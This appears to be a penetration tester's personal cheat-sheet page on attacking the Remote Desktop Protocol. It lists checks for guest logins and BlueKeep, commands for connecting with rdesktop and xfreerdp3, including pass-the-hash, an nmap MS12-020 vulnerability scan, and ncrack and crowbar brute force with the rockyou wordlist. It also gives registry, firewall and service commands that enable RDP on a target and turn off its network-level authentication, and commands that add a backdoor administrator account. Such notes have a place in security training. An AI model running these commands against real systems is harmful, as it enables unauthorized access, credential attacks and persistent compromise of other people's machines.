### **Checks**

- [ ] Check if you can login with default guest account and blank password
- [ ] Check if you can brute force users
- [ ] Check for BlueKeep

### Operators Handbook pg 362
Pay attention to the possibility of adding a user via other vulnerability and accessing by RDP. [[Port 139 445 (Exploits)#MS17-010 method 2 RDP]]

 Run to get freerdp3 packages to use `xfreerdp3`
 ```bash
 sudo apt install freerdp3-dev
 sudo apt install freerdp3-x11
 ```

#### rdesktop Domain User:
```bash - kali
rdesktop -u $USER -p $PASSWORD -d $NETBIOS_DOMAIN_NAME -g 85% -r disk:share=/home/kali/Desktop/ $TARGET
```

#### rdesktop
```bash - kali
rdesktop $TARGET -u foobar -p Pass123 -g 1024x768 -x 0x80
```

Connect with share:
```bash - kali
rdesktop -u $USER -p $PASSWORD -g 85% -r disk:share=/home/kali/Desktop/ $TARGET
```

Guest login:
```bash - kali
rdesktop -u guest -p guest $TARGET -g 94%
```

#### xfreerdp Domain User:
```
/tls-seclevel:0 /timeout:80000
```

```bash - kali
xfreerdp3 /u:$USER /p:$PASSWORD /d:$NETBIOS_DOMAIN_NAME /v:$TARGET +auto-reconnect /dynamic-resolution
```

```bash - kali
xfreerdp3 /u:$USER /pth:$HASH /d:$NetBIOS_Domain_Name /v:$TARGET +auto-reconnect /dynamic-resolution
```

Connect with share:
```bash - kali
xfreerdp3 /u:$USER /p:$PASSWORD /v:TARGET /drive:kali,/home/kali/Desktop/ +auto-reconnect /dynamic-resolution
```

#### xfreerdp3
```bash - kali
xfreerdp3 /v:$TARGET -sec-nla /u:"" +auto-reconnect /dynamic-resolution
```

```bash - kali
xfreerdp3 /u:$USER /p:$PASSWORD /cert:ignore /v:$TARGET +auto-reconnect /dynamic-resolution
```

```bash - kali
nmap -p 3389 --script=rdp-vuln-ms12-020.nse $TARGET
```

```bash - kali
ncrack -vv --user $USER -P /usr/share/wordlists/rockyou.txt rdp://$TARGET
```

```bash - kali
python crowbar.py -b rdp -s $TARGET/32 -u $USER -C ../rockyou.txt -v
```
### Enabling RDP
```powershell - windows
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

```batch - windows
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
```

```batch - windows
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

```batch - windows
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

```
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

```
sc start TermService
```

#### Add a new user to Admin, good for RDP
```batch - kali
net user foobar Pass123 /add
```

```batch - kali
net localgroup Administrators foobar /add
```

```batch - kali
sc config TermService start=auto
```

```batch - kali
net start TermService
```

```bash - kali
rdesktop -g 85% -r disk:share=/home/kali/Desktop/ -u foobar -p Pass123 $TARGET
```

#### We can use `--packet-trace` to track the individual packages and inspect their contents manually
```bash 
nmap -sV -sC $TARGET -p3389 --packet-trace --disable-arp-ping -n
```

A Perl script named [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes.

To install:
```
sudo cpan 
```

Then type:
```
install Encoding::BER
```

```bash 
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
```

```
 ./rdp-sec-check.pl $TARGET
```


See also:
[[Crowbar]]